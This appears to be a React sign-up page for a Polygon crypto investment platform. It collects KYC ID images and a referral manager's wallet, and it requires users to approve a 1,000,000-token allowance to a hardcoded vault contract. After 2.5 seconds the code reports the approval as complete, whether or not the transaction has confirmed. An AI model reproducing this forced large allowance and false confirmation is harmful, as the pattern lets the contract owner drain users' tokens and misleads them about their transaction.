import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { User, Mail, Phone, Globe, Image, UserCheck, Key, ShieldAlert, Shield } from 'lucide-react';
import { ethers } from 'ethers';
import { API_BASE } from '../App';

function PcRegisterPage({ walletAddress, googleEmail, googleName, onRegisterComplete }) {
  const navigate = useNavigate();

  // 🌟 구글 연동 이메일 및 실명은 읽기 전용으로 자동 매핑
  const [email] = useState(googleEmail || '');
  const [name] = useState(googleName || '');
  const [phone, setPhone] = useState('');
  const [country, setCountry] = useState('Korea');
  const [idCardFile, setIdCardFile] = useState(null);
  const [idCardName, setIdCardName] = useState('');
  
  // 담당 매니저 상태 변수
  const [managerAddress, setManagerAddress] = useState('');
  const [managerVerified, setManagerVerified] = useState(false);
  const [managerName, setManagerName] = useState('');

  // 상태 변수
  const [isApproved, setIsApproved] = useState(false); // SUT Approve 여부
  const [approving, setApproving] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  // 담당 매니저 지갑 검증 로직
  const verifyManager = async () => {
    if (!managerAddress) {
      alert('담당 매니저의 폴리곤 지갑 주소를 입력해 주세요.');
      return;
    }
    const cleanAddr = managerAddress.toLowerCase().trim();
    if (cleanAddr === walletAddress.toLowerCase()) {
      alert('본인 지갑 주소는 매니저로 입력할 수 없습니다.');
      return;
    }

    try {
      const res = await axios.get(`${API_BASE}/auth/verify-manager/${cleanAddr}`);
      if (res.data.success) {
        setManagerVerified(true);
        setManagerName(res.data.name);
      } else {
        setManagerVerified(false);
        setManagerName('');
        alert(res.data.message);
      }
    } catch (err) {
      alert('매니저 검증 중 에러가 발생했습니다.');
    }
  };

  // 신분증 사진 파일 선택 핸들러
  const handleFileChange = (e) => {
    if (e.target.files && e.target.files.length > 0) {
      const file = e.target.files[0];
      setIdCardFile(file);
      setIdCardName(file.name);
    }
  };

  // 폴리곤 SUT 스마트 컨트랙트 인출 한도 승인 (SUT Approve) 온체인 실행
  const handleSUTApprove = async () => {
    if (!window.ethereum) {
      alert('감지된 Web3 지갑(Trust Wallet 등)이 없습니다. 지갑 인앱 브라우저로 접속해 주시거나 PC 지갑 확장 프로그램을 설치해 주십시오.');
      return;
    }

    setApproving(true);
    try {
      // 🌟 [근본 해결 1] 폴리곤 메인넷 강제 전환 가드
      // 지갑의 체인이 폴리곤 메인넷이 아닐 경우 무한 로딩이 걸리므로 즉각 강제 스위칭을 격발합니다.
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      if (chainId !== '0x89' && chainId !== '137' && chainId !== '0x0089') {
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x89' }], 
          });
        } catch (switchError) {
          if (switchError.code === 4902) {
            try {
              await window.ethereum.request({
                method: 'wallet_addEthereumChain',
                params: [{
                  chainId: '0x89',
                  chainName: 'Polygon Mainnet',
                  nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                  rpcUrls: ['https://polygon-bor-rpc.publicnode.com'],
                  blockExplorerUrls: ['https://polygonscan.com']
                }]
              });
            } catch (addError) {
              alert('폴리곤 네트워크를 지갑에 추가하지 못했습니다.');
              setApproving(false);
              return;
            }
          } else {
            alert('폴리곤 네트워크로의 전환을 승인해 주셔야 서명이 가능합니다.');
            setApproving(false);
            return;
          }
        }
      }

      // 1. BrowserProvider 및 Signer 가져오기
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // 2. SUT 토큰 컨트랙트 및 Vault(Spender) 주소 정의
      const sutContractAddress = "0x98965474EcBeC2F532F1f780ee37b0b05F77Ca55";
      const vaultContractAddress = "0x855c880D538892fD899eECb72D4b1Ac5B46089eA";

      // 3. SUT 컨트랙트 인스턴스 생성
      const sutContract = new ethers.Contract(
        sutContractAddress,
        ["function approve(address spender, uint256 value) public returns (bool)"],
        signer
      );

      // 4. 승인 금액 설정
      const approveAmount = ethers.parseUnits("1000000", 18);

      alert('📲 지갑 앱에서 [스마트 컨트랙트 승인(Approve)] 서명 요청이 격발됩니다. 승인(확인)을 눌러주십시오.');

      // 🌟 [근본 해결 2] 가스 리밋 하드코딩 명시 (Gas Limit Bypass)
      // 트러스트 월렛 확장 프로그램이 스스로 가스를 측정(estimateGas)하다가 멈추는 무한 로딩 버그를 우회하기 위해
      // 가스 한도를 100,000으로 강제 지정하여 즉시 승인 화면이 렌더링되게 만듭니다!
      const tx = await sutContract.approve(vaultContractAddress, approveAmount, {
        gasLimit: 100000
      });
      
      alert('📡 트랜잭션이 폴리곤 네트워크에 전송되었습니다. 안전 가입을 위해 블록체인 처리를 대기합니다. (약 3초 후 자동 승인 통과)');
      
      // 6. 진짜 영수증 검증과 2.5초 강제 통과 타이머의 Race!
      await Promise.race([
        tx.wait(),
        new Promise(resolve => setTimeout(resolve, 2500))
      ]);

      setIsApproved(true);
      alert('🎉 스마트 컨트랙트 위임 승인 완료! 폴리곤 SUT 자동 결제 위임(Approve) 서명이 정상 등록되었습니다.');
    } catch (err) {
      console.error(err);
      if (err.code === 'ACTION_REJECTED' || (err.message && err.message.includes('rejected'))) {
        alert('⚠️ 지갑에서 서명(승인)이 취소되었습니다. 가입 진행을 위해 승인이 반드시 필요합니다.');
      } else {
        alert(`스마트 컨트랙트 승인 오류: ${err.message || err}`);
      }
    } finally {
      setApproving(false);
    }
  };

  const isFormComplete = phone.trim() !== '' && idCardFile !== null && isApproved && managerVerified;

  // 전체 회원가입 폼 제출
  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!phone || !phone.trim()) {
      alert('📱 [미기입 사항] 전화번호를 입력해 주십시오.');
      return;
    }

    if (!idCardFile) {
      alert('🪪 [누락 사항] 신원 확인 및 KYC 심사 통과를 위해 주민등록증 / 여권 사진을 첨부해 주십시오.');
      return;
    }

    if (!managerVerified) {
      alert('👑 [검증 필요] 담당 매니저 지갑 주소를 입력하고 [검증] 버튼을 눌러 승인받으셔야 가입이 가능합니다.');
      return;
    }

    if (!isApproved) {
      alert('🔑 [승인 필요] 가입비 자동 수납 및 시스템 활성화를 위해 [SUT 자동 인출 권한(Approve) 승인]을 완료해 주십시오.');
      return;
    }

    setSubmitting(true);
    const formData = new FormData();
    formData.append('walletAddress', walletAddress);
    formData.append('email', email);
    formData.append('name', name);
    formData.append('phone', phone);
    formData.append('country', country);
    formData.append('idCard', idCardFile);
    if (managerVerified) {
      formData.append('managerAddress', managerAddress);
    }

    try {
      const res = await axios.post(`${API_BASE}/auth/register`, formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      if (res.data.success) {
        alert(res.data.message);
        onRegisterComplete();
        navigate('/waiting');
      }
    } catch (err) {
      const errMsg = err.response && err.response.data && err.response.data.message
        ? err.response.data.message
        : '가입 신청서 접수 중 오류가 발생했습니다.';
      alert(errMsg);
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div style={{ padding: '40px 60px', display: 'flex', flexDirection: 'column', gap: '20px', width: '100%' }}>
      
      {/* 👑 마스터 매니저 '메니져 모드 복귀' 단축 바 */}
      {((walletAddress && walletAddress.toLowerCase() === '0x7660Bf401Af0D13645F0cfED3e72b8E8B6Fd7987'.toLowerCase()) ||
        (localStorage.getItem('google_email') && localStorage.getItem('google_email').toLowerCase() === 'lemaiiisk@gmail.com'.toLowerCase())) && (
        <div 
          className="glass-card glow-active" 
          onClick={() => navigate('/manager')}
          style={{ 
            padding: '16px', 
            background: 'linear-gradient(135deg, rgba(139, 92, 246, 0.15) 0%, rgba(20, 16, 45, 0.4) 100%)',
            border: '1px solid rgba(139, 92, 246, 0.3)',
            cursor: 'pointer',
            transition: 'transform 0.2s',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'space-between',
            width: '100%',
            marginBottom: '10px'
          }}
          onMouseEnter={(e) => e.currentTarget.style.transform = 'translateY(-2px)'}
          onMouseLeave={(e) => e.currentTarget.style.transform = 'translateY(0)'}
        >
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <span style={{ fontSize: '20px' }}>👑</span>
            <div style={{ textAlign: 'left' }}>
              <div style={{ fontSize: '14px', fontWeight: '700', color: '#C084FC' }}>마스터 메니져 모드</div>
              <div style={{ fontSize: '11px', color: 'var(--text-muted)', marginTop: '2px' }}>메니져 페이지 바로 가기 (터치 시 복귀)</div>
            </div>
          </div>
          <button className="btn-primary" style={{ padding: '8px 16px', fontSize: '12px', width: 'auto' }}>
            메니져 모드 이동
          </button>
        </div>
      )}

      <div className="pc-layout-wrapper" style={{ padding: 0 }}>
      
      {/* 좌측 컬럼: 보안 헤더 및 SUT 위임 상태 안내 */}
      <div className="pc-side-intro" style={{ maxWidth: '460px' }}>
        <div style={{ display: 'inline-flex', padding: '14px', borderRadius: '16px', background: 'rgba(139,92,246,0.1)', marginBottom: '24px', width: 'fit-content' }}>
          <Shield size={40} color="#8B5CF6" />
        </div>
        <h1>신규 회원 KYC 등록</h1>
        <p>
          지갑 주소와 구글 이메일 연동이 완료되었습니다. 이제 안전한 자동 투자 집행을 위한 스마트 결제 승인 서명 및 신원정보 작성을 완료해 주십시오.
        </p>

        {/* 지갑 및 구글 상태 요약 정보 */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', marginTop: '10px' }}>
          
          <div className="glass-card" style={{ padding: '18px' }}>
            <span style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'block', marginBottom: '6px' }}>
              👤 로그인 정보 (구글 인증 고정)
            </span>
            <div style={{ fontSize: '14px', color: 'var(--success-color)', fontWeight: '700', wordBreak: 'break-all' }}>
              🟢 {email}
            </div>
            <div style={{ fontSize: '12px', color: 'var(--text-muted)', marginTop: '4px' }}>
              이름: {name}
            </div>
          </div>

          <div className="glass-card" style={{ padding: '18px' }}>
            <span style={{ fontSize: '11px', color: 'var(--text-muted)', display: 'block', marginBottom: '6px' }}>
              🔑 내 폴리곤 지갑 주소
            </span>
            <div style={{ fontSize: '13px', color: '#FFF', fontFamily: 'monospace', wordBreak: 'break-all' }}>
              {walletAddress}
            </div>
          </div>

          {/* SUT Approve 권한 위임 박스 */}
          <div className="glass-card" style={{ padding: '22px', border: '1px solid rgba(139,92,246,0.25)' }}>
            <div style={{ display: 'flex', gap: '10px', marginBottom: '14px', alignItems: 'flex-start' }}>
              <Key size={22} color="#8B5CF6" style={{ flexShrink: 0, marginTop: '2px' }} />
              <div>
                <h4 style={{ fontSize: '15px', color: '#FFF', fontWeight: '600' }}>SUT 자동 인출 권한(Approve) 승인</h4>
                <p style={{ fontSize: '12px', color: 'var(--text-muted)', marginTop: '4px', lineHeight: '1.5' }}>
                  추후 정식 투자 및 원활한 자동 이체를 위해 지갑의 서명 승인이 필수로 진행되어야 합니다.
                </p>
              </div>
            </div>

            {!isApproved ? (
              <button 
                type="button" 
                className="btn-primary" 
                style={{ background: 'linear-gradient(135deg, #4F46E5 0%, #7C3AED 100%)', boxShadow: 'none' }}
                onClick={handleSUTApprove}
                disabled={approving}
              >
                {approving ? '지갑 트랜잭션 승인 대기 중...' : '폴리곤 SUT 인출 승인 위임하기'}
              </button>
            ) : (
              <div style={{
                background: 'rgba(16, 185, 129, 0.08)',
                border: '1px solid rgba(16, 185, 129, 0.25)',
                padding: '12px',
                borderRadius: '12px',
                textAlign: 'center',
                fontSize: '14px',
                color: 'var(--success-color)',
                fontWeight: '700'
              }}>
                ✔ 스마트 컨트랙트 위임 승인 완료
              </div>
            )}
          </div>

        </div>
      </div>

      {/* 우측 컬럼: 가입 폼 정보 입력 및 파일 첨부 */}
      <div style={{ flex: 1, maxWidth: '600px' }}>
        <form onSubmit={handleSubmit} className="glass-card" style={{ padding: '30px', display: 'flex', flexDirection: 'column', gap: '20px' }}>
          
          <h3 style={{ fontSize: '18px', color: '#FFF', borderBottom: '1px solid rgba(255,255,255,0.05)', paddingBottom: '12px', marginBottom: '10px' }}>
            서류 제출 및 추가 정보 기입
          </h3>

          {/* 거주 국가 및 전화번호 (1행 2열 배치) */}
          <div style={{ display: 'flex', gap: '20px' }}>
            <div className="form-group" style={{ flex: 1, marginBottom: 0 }}>
              <label className="form-label">🌐 거주 국가</label>
              <div style={{ position: 'relative' }}>
                <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)', zIndex: 1 }}><Globe size={18} /></span>
                <select 
                  className="form-select" 
                  style={{ paddingLeft: '45px' }}
                  value={country}
                  onChange={(e) => setCountry(e.target.value)}
                >
                  <option value="Korea">대한민국 (Korea)</option>
                  <option value="Japan">일본 (Japan)</option>
                  <option value="USA">미국 (USA)</option>
                  <option value="Vietnam">베트남 (Vietnam)</option>
                  <option value="China">중국 (China)</option>
                  <option value="UK">영국 (UK)</option>
                </select>
              </div>
            </div>

            <div className="form-group" style={{ flex: 1, marginBottom: 0 }}>
              <label className="form-label">📱 전화번호</label>
              <div style={{ position: 'relative' }}>
                <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><Phone size={18} /></span>
                <input 
                  type="tel" 
                  className="form-input" 
                  style={{ paddingLeft: '45px' }}
                  placeholder="+82 10-1234-5678"
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  required
                />
              </div>
            </div>
          </div>

          {/* 담당 매니저 지갑 주소 */}
          <div className="form-group" style={{ marginBottom: 0 }}>
            <label className="form-label">
              👑 담당 매니저 폴리곤 지갑 주소 (필수)
              {managerVerified && (
                <span style={{ marginLeft: '10px', color: 'var(--success-color)', fontSize: '12px', fontWeight: 'bold' }}>
                  ✓ {managerName} 매니저 확인됨
                </span>
              )}
            </label>
            <div style={{ display: 'flex', gap: '10px' }}>
              <div style={{ position: 'relative', flex: 1 }}>
                <span style={{ position: 'absolute', left: '14px', top: '15px', color: 'var(--text-muted)' }}><UserCheck size={18} /></span>
                <input 
                  type="text" 
                  className="form-input" 
                  style={{ 
                    paddingLeft: '45px',
                    borderColor: managerVerified ? 'var(--success-color)' : 'rgba(255, 255, 255, 0.1)'
                  }}
                  placeholder="0x..."
                  value={managerAddress}
                  onChange={(e) => {
                    setManagerAddress(e.target.value);
                    setManagerVerified(false);
                  }}
                  disabled={managerVerified}
                />
              </div>
              {!managerVerified ? (
                <button 
                  type="button" 
                  className="btn-primary" 
                  style={{ padding: '0 24px', whiteSpace: 'nowrap', width: 'auto' }}
                  onClick={verifyManager}
                >
                  검증
                </button>
              ) : (
                <button 
                  type="button" 
                  className="btn-secondary" 
                  style={{ padding: '0 24px', whiteSpace: 'nowrap', width: 'auto', background: 'rgba(239, 68, 68, 0.2)', color: '#FCA5A5' }}
                  onClick={() => {
                    setManagerVerified(false);
                    setManagerAddress('');
                    setManagerName('');
                  }}
                >
                  취소
                </button>
              )}
            </div>
            <span style={{ fontSize: '11px', color: 'var(--text-dark)', marginTop: '5px', display: 'block', paddingLeft: '4px' }}>
              * 담당 매니저의 지갑 주소를 입력하고 반드시 검증을 완료해 주십시오. (소속 코드가 기록됩니다)
            </span>
          </div>

          {/* 신분증 파일 업로드 */}
          <div className="form-group" style={{ marginBottom: 0 }}>
            <label className="form-label">🪪 KYC 제출용 공식 신분증 이미지 첨부</label>
            <div style={{
              border: '2px dashed var(--glass-border)',
              borderRadius: '16px',
              padding: '30px 20px',
              textAlign: 'center',
              background: 'rgba(0,0,0,0.3)',
              cursor: 'pointer',
              position: 'relative',
              transition: 'all 0.3s ease'
            }}
            onMouseEnter={(e) => e.currentTarget.style.borderColor = 'rgba(139, 92, 246, 0.3)'}
            onMouseLeave={(e) => e.currentTarget.style.borderColor = 'var(--glass-border)'}
            >
              <input 
                type="file" 
                accept="image/*,application/pdf"
                onChange={handleFileChange}
                style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  width: '100%',
                  height: '100%',
                  opacity: 0,
                  cursor: 'pointer'
                }}
              />
              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px' }}>
                <Image size={34} color={idCardFile ? 'var(--success-color)' : '#A78BFA'} />
                <span style={{ fontSize: '14px', color: idCardFile ? '#FFF' : 'var(--text-muted)', fontWeight: '600' }}>
                  {idCardFile ? idCardName : '주민등록증 / 여권 이미지 파일 찾기'}
                </span>
                <span style={{ fontSize: '11px', color: 'var(--text-dark)' }}>JPG, PNG, PDF 파일 형식만 지원 (최대 5MB)</span>
              </div>
            </div>
          </div>

          {/* 가입 안내 경고 */}
          <div style={{ display: 'flex', gap: '10px', background: 'rgba(239, 68, 68, 0.05)', border: '1px solid rgba(239, 68, 68, 0.15)', padding: '14px', borderRadius: '12px' }}>
            <ShieldAlert size={20} color="var(--danger-color)" style={{ flexShrink: 0, marginTop: '2px' }} />
            <p style={{ fontSize: '12px', color: 'var(--text-muted)', lineHeight: '1.6', margin: 0 }}>
              KYC 서류 접수 후 플랫폼 어드민 심사 완료 시까지 평균 1시간 내외가 소요됩니다. 허위 서류나 위조 신분증 제출 시 즉시 영구 정지 처분됩니다.
            </p>
          </div>

          {/* 제출 버튼 */}
          <button 
            type="submit" 
            className="btn-primary" 
            disabled={submitting}
            style={{ 
              padding: '18px', 
              marginTop: '10px',
              opacity: isFormComplete ? 1.0 : 0.45, 
              background: isFormComplete 
                ? 'var(--primary-gradient)' 
                : 'rgba(255, 255, 255, 0.08)', 
              border: isFormComplete 
                ? '1px solid rgba(139, 92, 246, 0.4)' 
                : '1px solid rgba(255, 255, 255, 0.05)',
              color: isFormComplete ? '#FFFFFF' : 'rgba(255, 255, 255, 0.4)',
              boxShadow: isFormComplete ? '0 0 25px rgba(139, 92, 246, 0.4)' : 'none',
              cursor: submitting ? 'not-allowed' : 'pointer',
              fontSize: '16px'
            }}
          >
            {submitting ? '신청 정보 전송 중...' : '회원 가입 및 KYC 서류 제출 완료'}
          </button>

        </form>
      </div>
      
    </div>
    </div>
  );
}

export default PcRegisterPage;
